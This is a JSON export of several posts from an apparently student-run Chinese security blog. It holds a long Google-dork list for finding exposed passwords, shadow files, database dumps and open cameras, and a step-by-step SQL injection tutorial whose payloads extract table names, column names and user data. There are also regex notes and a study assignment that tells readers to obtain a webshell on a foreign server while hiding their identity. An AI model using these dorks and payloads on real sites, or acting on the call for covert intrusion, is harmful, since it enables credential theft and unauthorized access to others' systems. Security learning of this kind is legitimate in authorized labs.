intext:password subject  \nfiletype:eml intext:password subject  \nfiletype:mbx intext:password subject  \nfiletype:mbx intext:password subject  \n \nFor network devices  \ninurl:indexframe.shtml axis  \nintitle: \"live view / -axis\"  \nintitle: \"live view/ -axis\"  \ninurl:view/view.sht  \nintitle: \"the axis 200 home page\"  \nintitle:liveapplet inurl:lvappl  \nintext: \"mobotix m1\" intext: \"open menu\"  \nintitle; \"viewerframe?mode=\"  \nsnc-rz30 home  \nintitle:flexwatch intext: \"home page ver\"  \nintitle:snc-z20 inurl:home/  \n\"powered by webcamxp\" \"pro\\broadcast\"  \nIntitle: \"remote ui:top page\"  \n(\"fiery webtools\" inurl:index2.html)  \n\"webtools enable observe, , flow print jobs\"  \nIntitle: \"network administration\" inurl: \"nic\"  \nInurl:sts_index.cgi  \nIntitle:ricoh intitle: \"network administration\"  \nIntitle: \"view and configure phaserlink\"  \nInurl:live_status.html  \n\"phaser 6250\" \"printer neighborhood\"  \n\"phaser? 740 color printer\" \"printer named:\" phaserlink  \n\"phaser 8200\" \"? xerox\" \"refresh\" \"email alerts\"  \nphaser? 840 color printer  \nintext:centreware inurl:status  \nintitle: \"Xerox workcentre pro -index\"  \n \nFor usernames  \n\"your username is\"  \nInurl:admin inurl:userlist  \nInurl:admin filetype:asp  \nInurl:userlist  \nInurl:php inurl:hlstats intext;server username  \nFiletype:ctl inurl:haccess.ctl basic  \nFiletype:reg reg intext: \"internet account manager\"  \nFiletype:wab wab  \nFiletype:mdb inurl:profiles  \nIndex.of perform.ini  \nInurl:root.asp?acs=anon  \nFiletype:conf inurl:proftpd.conf –sample  \nFiletype:log username putty  \nFiletype:rdp rdp  \nIntitle:index.of .bash_history  \nIntitle:index.of .sh_history  \n\"index of \" lck  \n+intext:webalizer +intext:total usernames +intext: \"usage   statistics for\"  \nFiletype:reg reg hkey_current_user username  \n \nFor password information  \nInurl:/db/main.mdb  \nFiletype:cfm \"cfapplication name\" password  \nFiletype:pass pass intext:userid  \nAllinurl:auth_user_file.txt  \nEggdrop filetype:user user  \nFiletype:ini inurl:flashfxp.ini  \nFiletype:url +inurl: ftp:// +inurl: \"@\"  \nInurl:zebra.conf intext:password –sample –test –tutorial –download\nFiletype:htpasswd htpasswd  \nIntitle: \"index of\" \".htpasswd\" \"htgroup\" –intitle: \"dist\" –apache –htpasswd.c  \nIntitle: \"index of\" \".htpasswd\" htpasswd.bak  \nhttp://*.*@www bob:bob \"sets mode: +k\"  \n\"your password if * remember this for later use\"  \nSignin filetype:url  \nLeapftp intile: \"index.of./\" sites.ini modified  \nInurl:lilo.conf filetype:conf password –tatercounter2000 –bootpwd –man  \nFiletype:config config intext:appsettings \"user id\"   \nFiletype:pwd service  \nIntitle:index.of administrators.pwd  \n\"# -frontpage-\"inurl:service.pwd ext:pwd inurl:_vti_pvt   inurl:(service|authos|administrators)  \nInurl: \"index of \"intext:globals.inc/.bak  \nFiletype:confoekakibbs  \nFiletype:dat wand.dat  \nInurl:ospfd.conf intext:password –sample –test –tutorial –download\nIndex.of passlist  \nInurl:passlist.txt  \nFiletype:dat \"password.dat\"  \nInurl:password.log filetype:log  \nFiletype:log inurl: \"password.log\"  \nInurl:people.lst filetype:lst  \nIntitle:index.of config.php  \nInurl:config.php dbuname dbpass  \nInurlnuke filetype:sql  \nFiletype:conf inurl:psybnc.conf \"user.pass=\"  \nFiletype:ini servudaemon  \nFiletype:conf slapd.conf  \nInurl: \"slapd.conf\" intext: \"credentials\" –manpage -\"manual page\" –man: -sample  \nInurl: \"slapd.conf\" intext: \"rootpw\" –manpage -\"manual page\" –man: -sample  \nFiletype:sql \"identified by\" –cvs  \nFiletype:sql password  \nFiletype:ini wcx_ftp  \nFiletype:netrc password  \nIndex.of.etc tial files  \nIntitle: \"index of ..etc\" passwd  \nIntitle:index.of passwd passwd.bak  \nIntitle: \"index of\" pwd.db  \nIntitle:index.of etc shadow  \nIntitle:index.of master.passwd  \nIntitle: \"index of\" spwd.db passwd –pam.conf  \nFiletype:bak inurl: \"htaccess| passwd |shadow |htusers\"  \nFiletype:inc dbconn  \nFiletype:inc intext:mysql_connect  \nFiletype:properties inurl:db   \nIntext:password  \nInurl:vtund.conf intext:pass –cvs  \nInurl: \"wvdial.conf\" intext; \"password\"  \nFiletype:mdb wwforum  \n\"autocreate=true password=*\"  \nFiletype:pwl pwl  \nFiletype:reg reg +intext; \"defaultusername\" intext:   \"defaultpassword\"  \nFiletype:reg reg +intext: \"internet account manager\"  \nFiletype:xls username password email  \nFiletype:xls inurl: \"password.xls\"  \nFiletype;xls private   \nInurl:admin filetype:xls  \nFiletype:xls inurl:contact  \nFiletype:xls inurl: \"email.xls\"  \nAllinurl:admin mdb  \nFiletype:mdb inurl:users.mdb  \nInurl:email filetype:mdb  \nInurl:backup filetype:mdb  \nInurl:profiles filetype:mdb  \nInurl:*db filetype:mdb  \n \nFor sql database dumps  \nInurl:nuke filetype:sql  \nFiletype:sql password  \nFiletype:sql \"indetified by\" –cvs  \n\"#dumping data for table username user users password\"  \n\"#mysql dump\" filetype:sql  \n\"#phpmyadmin mysql-dump\" filetype:txt  \n\"#phpmyadmin mysql-dump\"  \n\"insert into\" –\"the  \n \nFor database files  \nFiletype:cfm \"cfapplication name \" password  \nFiletype:mdb inurl:user.mdb  \nInurl:email filetype:mdb  \nInurl:forum filetype:mdb  \nInurl:/db/main.mdb  \nInurl:profiles filetype:mdb  \nFiletype:asp dbq=\"* server.mappath(\"mdb\")\"  \nAllinurl;admin mdb  \n\n## 三．Google Hacking 工具分析  \n 常见Google Hacking的工具有 gooscan  goolink  wikto  Athena  Sitedigger   \n###### A．Gooscan\n   gooscan是UNIX系统下对google的搜寻工具,可自动查询，用作外部服务器评估和信息收集阶段目标的攻击性评价终端。）  \n \n######  B.Athena 支持开放的XML配置和多种搜索引擎，相当于hacker搜索集成工具。\n  \n######  C.Wikto   \n可以寻找到网页索引文件，如通讯录和档案网址。同时它还能搜寻出滥用的脚本和可以直接执行命令的网络服务器。Googler的主要功能是发现站点的索引目录，需要一个 Google web API key。\n \n \n######  D.SiteDigger\n Sitedigger 能够批量处理搜索要求。在获取Google API   许可文件之后可以通过搜索引擎自动的寻找出站点的易受攻击点。  \n （参照 Kartik Trivedi 《Identifying Information Leakage Using Search Engines》）\n \n######  E．Goolink\n   Goolink 能够删除用户检索的缓存，收集和显示你所需要的链接，很容易发现向google敞开的攻击弱点，并且可以自定义搜索方式或者导入 Googledorks 文件。\n\n\n## 四。防范措施\n\n   提出反搜索引擎的架构（处于完善阶段……）","tags":["Google hacking"]},{"title":"正则表达式学习笔记","url":"/2018/01/14/正则表达式学习笔记/","content":"#  正则表达式学习笔记  \n##  定义  \n正则表达式regular expression(也称“regex”或“regexp”)是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。  \n\n举个例子：在平时的计算机操作中，当我们搜索一个文件时，希望找到所有的Word文档，可以在搜索栏的文件名中输入“\\*.doc”来匹配所有以“.doc”结尾的文件名，“\\*”被称为通配符，可以任意匹配字符串。正则表达式的作用就类似于这种应用。  \n##  格式  \n在JavaScript和php中，正则表达式是由两条斜杠“/”所包围的（Java则不用，由于正则表达式是数学概念，在不同的语言中核心语法是相似的，只是存在细微差别，这里我主要针对的是js）。  \n\n正则表达式语言由两种基本字符类型组成：原义（正常）文本字符和元字符。元字符使正则表达式具有处理能力。所谓元字符就是指那些在正则表达式中具有特殊意义的专用字符，可以用来规定其前导字符（即位于元字符前面的字符）在目标对象中的出现模式，描述文本模式的表达对象。  \n\n```\nvar reg01=/abc/;\nvar reg02=/a{1,2}b/g;\nvar reg03=/a{1,2}b/ig;\nvar reg04=/^[\\u0391-\\uFFE5]+$/i;\n```\n上面实例中，第二个/后面的“ig”等是匹配模式，可选。其含义分为：  \n- [ ] “i”为“ignore case”，即忽略大小写。\n- [ ] “g”为“global search”，即全局搜索。\n- [ ] “m”为“multiline search”，即多行搜索。  \n\n##  含义\n正则表达式的两个斜杠之间的模式字符串如果为一般的字母或数字，表示直接匹配相应的字符。例如“/abcd/”匹配字符串“abcd123”中“abcd”的部分。花括号“{”等特殊字符在正则表达式中，又有其特殊的含义。下面是正则表达式中各字符的匹配含义。  \n#### 一、普通字符\n\n普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。  \n#### 二、非打印字符\n\n非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：\n![非打印字符](http://ww3.sinaimg.cn/large/0060lm7Tly1fnfasb6191j30si0dm750.jpg)\n\n#### 三、特殊字符\n\n所谓特殊字符，就是一些有特殊含义的字符，如\"\\*.txt\"中的\\*，简单的说就是表示任何字符串的意思。如果要查找文件名中有\\*的文件，则需要对\\*进行转义，即在其前加一个\\。ls\\ \\*.txt。\n\n许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符\"转义\"，即，将反斜杠字符 (\\) 放在它们前面。下表列出了正则表达式中的特殊字符： \n![特殊字符](http://ww4.sinaimg.cn/large/0060lm7Tly1fnfaurs77ej30si0j8dh5.jpg)\n补充  \n![元字符补充](http://ww3.sinaimg.cn/large/0060lm7Tly1fngg0n9a9bj30b60963z4.jpg)\n\n#### 四、限定符\n\n限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有*或+或?或{n}或{n,}或{n,m}共6种。\n\n正则表达式的限定符有：\n![限定字符](http://ww1.sinaimg.cn/large/0060lm7Tly1fnfavvxvudj30sd0d5dgw.jpg)\n\n #### 五、定位符\n\n定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。\n\n定位符用来描述字符串或单词的边界，^和$分别指字符串的开始与结束，\\b描述单词的前或后边界，\\B表示非单词边界。\n![定位符](http://ww1.sinaimg.cn/large/0060lm7Tly1fnfaxh7gagj30sc08u3yt.jpg)\n注意：不能将限定符与定位点一起使用。由于在紧靠换行或者字边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。 \n\n##  实例  \n下面我们找几个实际的例子来分析一下，就更加明白了。  \n1. 校验中文\n```\n^[\\u4e00-\\u9fa5]{0,}$\n```  \n^开始[]中是要匹配的主要内容，其中的\\u4e00是一个汉字的Unicode编码，而\\u4e00-\\u9fa5就表示所有汉字的Unicode编码，后面的{0,}表示至少匹配0次，最多不限制长度，$结束。\n2. 验证身份证号（18位）  \n```\n^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$\n```\n^开始[1-9]匹配1-9数字中的一个，\\d{5}表示匹配5个0-9的数字，后面的一样体会，((0\\d)|(1[0-2]))这一段是单独括出来表示年份的，|表示的或条件（左右二选一），0\\d是0+一个数字，1[0-2]是1+0,1,2,中的一个，后面表示年月的类似，最后面的([0-9]|X)则是给定了身份证最后一位要么是0-9数字，要么是X，$结束正则表达式  \n3. 验证email地址  \n\n```\n^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$\n```\n^开始\\w匹配数字字母下划线或汉字，表示匹配前面的表达式一次或多次，考虑到用户脑回路比较清奇[+-.]表示匹配其中的+-.其中一个，*匹配前面的子表达式一次或多次，后面大致相同理解，其中\\\\.是转义字符就表示.，$结束\n\n这里举的例子不多，可以看看下面参考文献中的二十个常用的正则表达式  \n## 贪婪与非贪婪模式  \n贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。如上面使用模式p匹配字符串str，结果就是匹配到：abcaxc(ab\\*c)。  \n\n非贪婪匹配：就是匹配到结果就好，就少的匹配字符。如上面使用模式p匹配字符串str，结果就是匹配到：abc(ab\\*c)。  \n\n仅从应用角度分析，可以这样认为，非贪婪模式，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。  \n这里要更深入了解具体可看参考文献。\n\n\n\n\n\n\n\n\n###### 参考文献\n[正则表达式之基础语法](https://www.cnblogs.com/francisblogs/p/6100665.html)  \n[正则表达式30分钟入门教程](http://deerchao.net/tutorials/regex/regex.htm)（推荐必看）  \n[Python正则表达式指南](https://zhuanlan.zhihu.com/p/25400344)  \n[知道这20个正则表达式，能让你少写1,000行代码](https://zhuanlan.zhihu.com/p/29163295)  \n[正则基础(贪婪与非贪婪模式)](http://www.9958.pw/post/preg_match)\n","tags":["正则表达式"]},{"title":"SQL注入基本步骤","url":"/2018/01/06/SQL注入基本步骤/","content":"\n# SQL注入基本步骤  \n\n## 什么是SQL注入  \n首先我们要知道的是SQL到底是什么。。。\n[sql语句百度百科](https://baike.baidu.com/item/sql%E8%AF%AD%E5%8F%A5/5714895?fr=aladdin)\n## SQL注入介绍  \n在正式开始之前，我们先讲讲什么是SQL注入。还记得小学语文考试上的填空题吗？\n\n我是_______________，喜欢___________________\n\n题目的意图明显是通过填空来了解答题者的名字和爱好。\n\n如果填成下面这样呢？ \n> 我是调皮的小男孩子，专职撩妹子。，~~喜欢_____________~~  \n\n这就是一个注入的例子，当出题者以为他已经定下了句子的主体结构，需要填空的内容是不会影响主体结构的，而填空者却通过填写的内容，修改了整句话的结构，这就是注入。\n\n以王宝强马蓉两人为例，对于王宝强来说，请来的经纪人是工作上的一部分，这也是他定下来的人生结构。他却没有想到，经纪人除了完成经纪人所应做的事情，还在背后干起别的事情来。对于王宝强来说，经纪人做的事情，就是一种注入，改变了他定义的结构组织。\n\n那什么是SQL注入就不言而喻了。当黑客通过精心构造的URL参数，或者表单提交的参数，拼接到预先定义好的SQL格式时，意外地改变了程序员预期的SQL结构时，SQL注入就构成了。执行该SQL语句已超出的程序员的意图。\n### 普通SQL注入步骤  \n#### 1.判断是否可以注入  \n\n如果要对一个网站进行SQL注入攻击，首先就需要找到存在SQL注入漏洞的地方，也就是寻找所谓的注入点。可能的SQL注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地方（我单纯的认为SQL注入点就是我们可以注释掉一部分SQL查询语句，并且在浏览器界面修改查询语句，利用数据库报错，来寻找能够利用的信息)\n最常用的寻找SQL注入点的方法，是在网站中寻找如下形式的页面链接： \n>http://www.xxx.com/xxx.asp?id=YY--+\n\n其中“YY”可能是数字，也有可能是字符串，分别被称为整数（数字）类型数据或者字符型数据。在本章中我们主要针对整数型数据进行SQL注入讲解。（我暂时粗浅的认识是字符型注入和数字型注入区别在于id值后面是否用单引号包住，字符型需要，数字型不需要）\n\n　　通常可以使用以下两种方法进行检测，判断该页面链接是否存在SQL注入漏洞。  \n##### （1）“加引号”法  \n在浏览器地址栏中的页面链接地址后面增加一个单引号，如下所示：\n>http://www.xxx.com/xxx.asp?id=YY’--+\n\n由于单引号在SQL语句中起闭合语句的作用，相当于yy后面会出现两个单引号，一个是人为添加的，一个是SQL语句中自带的，所以会导致SQL语句语法错误，网页无法显示，所以存在SQL注入点。  \n##### （2）“1=1和1=2”法   \n在浏览器地址栏中的网页链接地址后面增加分别增加and 1=1 和and 1=2，如下所示：   \n>http://www.xxx.com/xxx.asp?id=YY and 1=1--+  \n>http://www.xxx.com/xxx.asp?id=YY and 1=2--+ \n\n其中的--+意思是注释掉后面的SQL语句，防止出现语法错误（由于这次针对整型，所以id值后面没有添加单引号），这两个语句相当于给SQL增加了一个判定条件，and表示并，相信大家高中的时候都学过并集，只有当and左右两边都是正确的，答案才会正确（即页面显示正常），显然id=YY是正确的，那么只需要判定and后面的就可以了，1=1显然正确，所以页面正常，1=2反之，所以也可以说明存在SQL注入点。 \n\n#### 2.获得字段数  \n\n这里就要讲到sql的order by子句了  \n微软解释order by子句：为select查询的列排序，如果同时制定了top关键词，order by子句在视图、内联函数、派生表和子查询中无效。  \n攻击者往往会注入order by子句来判断此表的列数（字段数） \n![order by子句](https://wx1.sinaimg.cn/mw1024/0072g83Qgy1fn7202npodj31kw0o67wi.jpg)  \n通过数据库抛出异常，我们已经可以知道当前的SQL语句有几列存在了。  \n在这里我们一般在网页链接地址后面增加order by加数字来猜出列数，如下所示： \n>http://www.xxx.com/xxx.asp?id=YY order by 3  --+\n\n通过不断地一次改变数字，看是否页面显示异常，来获得字段数。 \n\n#### 3.获得显示位  \n\n这里我们要了解到SQL语句中的联合查询（union select百度百科：联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。）\n这里的显示位就是能够在网页上直接可以看见的数据显示处，一般在网页链接后面加union select加你上一步获得的字段数从1开始依次排序，如下所示：  \n>http://www.xxx.com/xxx.asp?id=YY union select 1,2,3  \n\n然后我们正常情况下会看见页面上会出现1,2,3三个字段数，说明已经获得显示位了，接下来我们就可以利用SQL注入在在几个显示位上获得我们想要的信息了。\n\n#### 4.获取数据库信息  \n\n现在来介绍几个在渗透测试中常用的几个函数和表库名。\n\n数据库名：database()\n\n数据库版本： version()\n\n数据库用户： user()\n\n操作系统： @@version_compile_os\n\n系统用户名： system_user()\n\n当前用户名： current_user\n\n连接数据库的用户名：session_user()\n\n读取数据库路径：@@datadir\n\nMYSQL安装路径：@@basedir\n\nload_file 转成16进制或者10进制 MYSQL读取本地文件函数\n\ninto outfile 写入函数\n\n储存所有表名信息的表 : information_schema.tables\n\n表名 ： table_name\n\n数据库名： table_schema\n\n列名 ： column_name\n\n储存所有列名信息的表 ： information_schema.columns  \n我们用一些我们想要了解的函数和数据库名代替之前的显位数（也就是上面一步的1,2,3），我们想要了解数据库名，版本和用户名，可以构造以下链接：\n>http://www.xxx.com/xxx.asp?id=YY union select database(),version(),user() --+\n\n接着就可以在显示位上依次看到数据库名，数据库版本，用户名了，记住这些你想获取的信息。 \n\n#### 5.获取当前数据库的表名  \n这里我用到了一个函数GROUP_CONCAT()  \nGROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。这样我们就可以在一个显示位上获得多个表名，而不是用limit子句去一个一个遍历了。\n>http://www.xxx.com/xxx.asp?id=YY union select group_concat(table_name),2,3 from\ninformation_schema.tables where table_schema=0x73716C696E20 \n\n其中的information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面，我们在后面加上.tables就是存放了数据库中所有表名的元数据。后面的0x73716C696E20其实是当前数据库的hex值，我们可以通过一些网上在线的hex转码找到数据库名对应的hex值。   \n我们在网页显示位上可以看见我们想要的表名。\n\n#### 6.获取列名\n\n假如我们选择了一个名叫user的表，那么我们就要开始从表中调取列名数据了，和上一步大同小异，我们构造如下URL：\n>http://www.xxx.com/xxx.asp?id=YY union select group_concat(column_name),2,3 from\ninformation_schema.columns where table_name=0x75736572 --+\n\n这样我们就获得了user表中的列名  \n\n#### 7.爆数据\n\n这里假如我们想要获取username列中的数据\n>http://www.xxx.com/xxx.asp?id=YY union select username,2,3 from user（表名） --+\n\n数据就出来了。  \n![比心](https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3976043197,1350628331&fm=27&gp=0.jpg)  \n## 后记  \n上面的总结只是我比较粗浅的理解，也借鉴了一些网上的教程，如有错误多多包涵。当然这只是最最基本的get注入，还有什么cookie注入、post注入、宽字节注入、盲注、延时注入等，我还没有去深入了解，等我学了再说吧。 \n![无能为力](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=406614704,1320230518&fm=27&gp=0.jpg)\n\n","tags":["SQL注入"]},{"title":"关于我","url":"/2017/12/24/关于我/","content":"\n## 关于我\n欢迎来到[我的博客](https://jas0nwhy.github.io \"一起来玩啊\")  \n<!--more-->\n标签：刚刚入坑信息安全专业大学生  \n地点：四川成都  \n技术：什么都不会  \n搭建目的:分享学习历程(求大佬带带我)  \nQQ：1456450951  \n### 一些小想法  \n在高考之前从来没有听说过信息安全专业，也没有任何的有关学习经历。被信安专业录取以后，才开始对信安有了最初的概念，自己什么都不会，ctf、SQL注入、文件包含、抓包。。。![一脸懵逼](https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=a4204cb57bf082022dc799397bcbd7d5/810a19d8bc3eb1353a911f2dae1ea8d3fc1f44d5.jpg)  \n后来想了一想，来都来了，还是要学一点的，正好有一个xx大挑战，去玩玩吧。。。![一脸懵逼2](https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2177487654,1605171879&fm=58&bpow=258&bpoh=256)\n结果一个月过去了只会签到题，蓝瘦香菇。一场比赛发现了周围周围全是大佬，我想我一定要向他们学习，好的，学学PHP吧，结果安装PHPstudy又搞三天才搞好（其实是自己傻，本来已经搞好了，因为www文件有一个helloworld.PHP，咦！显示效果和教程不一样诶，一直停在了那里没有反映过来）  \n再后来，在同寝室某大佬的指导下，开始做了一些ctf平台的题，好像开了一扇新的大门，感觉有点意思了，开始想去主动了解一些东西了，可是还是很菜，很多题都要看了write up才明白。  \n差不多一个学期要结束了，大学真的很忙，在搞好学习的同时，还要忙学生会、社团。剩下的一点点时间拿来学习技术，感觉学的非常杂乱，不知道自己该怎么去学了，这个时候看见xx小组招新了（可惜招新的时候去了重庆）![日](http://u.candou.com/2017/0802/1501660799721.jpg)\n好吧，出了web任务了，还有一个寒假，好好学学，至少有一个大概的方向了，就这样吧。。。\n\n如果有什么问题可以联系我的邮箱<1456450951@qq.com>![独自哭泣](https://b-ssl.duitang.com/uploads/item/201704/09/20170409213006_43GBH.thumb.700_0.jpeg)\n","tags":["关于我"]},{"title":"web任务来了！！！","url":"/2017/12/24/web任务来了!!!!!!/","content":"\n## 知识管理🚩\n\n- 搭建自己的博客,推荐使用Github+Hexo.\n  - https://github.com/limedroid/HexoLearning\n- 熟练使用markdown编写文档.\n  - http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C\n- 使用云笔记(推荐为知笔记,有道云笔记,印象笔记)\n<!--more-->\n\n## 代码审计🚩\n\n了解常见web漏洞的原理,利用及修复.\n\n* SQL注入\n  * http://bobao.360.cn/learning/detail/3758.html\n  * <http://websec.ca/kb/sql_injection> \n* 文件包含\n  * http://www.cnblogs.com/iamstudy/articles/include_file.html\n* 命令执行\n  * https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\n  * http://pupiles.com/shellcode.html\n* 代码注入\n  * https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/\n\n(上面给的链接仅作参考,不是看几篇博客就完了🐸)\n\n推荐书籍(必看👀):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》\n\n熟悉Linux下的常用操作,包括但不限于:\n\n* 了解概念\n\n\n* SSH配置\n* 软件的安装及卸载\n* 文件操作\n* lamp配置\n* shadowsocks配置\n* ......\n\n推荐书籍: 《鸟哥的Linux私房菜-基础篇》\n\n## 渗透测试🚩\n\n熟悉Kali Linux下常用渗透测试工具的使用.\n\n* SQLMAP\n* BurpSuite\n* NMAP\n\n了解常规渗透测试流程,掌握常用测试手段:\n\n* 信息收集\n* 端口扫描\n* 暴力破解\n* ......\n\n尝试在隐藏身份的情况下,获取一台**境外**服务器的webshell.\n\n## 怎么学\n\n学习过程中最重要的是对**原理**的理解(Know it, then hack it),技术手段每天都更新,但原理是相通的.\n\n我以\"SQL注入\"为栗,讲下我个人学习的一般思路.\n\n1. 目标: 掌握SQL注入漏洞\n\n2. 收集相关资料(书籍,博客,paper等几乎所有能找到的),找出掌握该漏洞需要得基础知识\n\n   * PHP环境搭建\n   * Mysql数据库\n   * SQL语言\n   * PHP编程\n   * PHP + MYSQL程序设计\n\n3. 掌握上面的基础之后(你可能又需要看几本书🙃),自己写出漏洞demo\n\n4. 利用漏洞demo分析漏洞产生的原理\n\n5. 熟悉该漏洞的各种利用\n   * 联合查询\n   * 报错注入\n     * 有哪些报错函数?原理分别是什么?\n   * 布尔盲注/延时盲注\n     * 区别是什么?分别在什么情况下使用?\n   * 写webshell\n     * webshell是什么?\n     * 什么情况下能写shell?\n   * 数据外带\n     * 为什么要数据外带?\n     * DNS又是什么鬼?\n   * 有哪些现成的利用工具?\n\n     * sqlmap => 熟练使用\n   * 如何用python编写注入脚本?\n     * python编程基础\n     * 所涉及的requests,re等模块的使用\n       * 正则表达式以及往下的无限延伸😆\n\n   \"熟悉\"的定义是我能随手写出各种注入的payload并且知道自己每一步在干嘛以及为什么要这样做.\n\n6. 常见防御情况下的绕过及各种trips,建议从各种**CTF**题里找案例来刷\n\n   * 怎么找题? => google,github\n     * 没法翻墙上google? => 学习vps下ss代理搭建\n       * linux不会用? => 学习linux下的各种操作\n     * 不会用github? => 学习github的使用\n     * 什么还有docker这种搭环境的神器? => 学习docker的使用\n     * 以及往下的无限延伸😆...\n   * 我能否总结出比网上更全的技巧?\n\n7. 学习如何防御SQL注入\n  * 黑名单过滤\n  * PDO查询\n  * 上述措施的代码实现\n\n8. 写出自己的学习总结/笔记(分享到博客会显得你很geek👍)\n\n9. 目标达成: 掌握SQL注入漏洞,在CTF比赛中不会畏惧这类题型,并且有信心解决它🤗.\n\n\n我比较推荐这种\"蔓延式\"的学习,这样你就永远不会不知道自己该学什么了🤣任何一个点都可以往下延伸出一个面\n\n## 给你们的任务❗❗❗\n\n完成上面3个小红旗下的所有要求,并写一份关于某**一个**你了解的最深入的漏洞的学习报告(请参考\"怎么学\"部分).\n\n**时间**: 寒假结束之前完成📆\n\n## 学习资源\n\n1. 看书!看书!看书!书上的知识是成体系的,强烈推荐下面几本入门书:\n\n   * 《白帽子讲web安全 》\n   * 《代码审计:企业级web代码安全架构》\n   * 《安全之路:Web渗透技术及实战案例解析(第2版) 》\n\n2. 各种安全新媒体/博客/微信公众号/论坛\n\n   * [安全脉搏](https://www.secpulse.com/)\n\n\n   * [安全客](https://www.anquanke.com/)\n   * [freebuf](http://www.freebuf.com/)\n\n   以及各个安全文章聚合网站,\n\n   * https://www.sec-wiki.com\n   * https://www.secdic.com\n\n3. 社区论坛\n\n   * [先知安全技术社区](https://xianzhi.aliyun.com/forum/)\n   * [90sec](https://forum.90sec.org/)\n   * [t00ls](https://www.t00ls.net/index.php)\n   * [wooyun知识库](http://www.anquan.us/)\n\n4. github\n\n   * https://github.com/wonderkun/CTF_web\n   * https://github.com/CHYbeta/Code-Audit-Challenges\n   * https://github.com/ctf-wiki/ctf-wiki","tags":["学习历程"]}]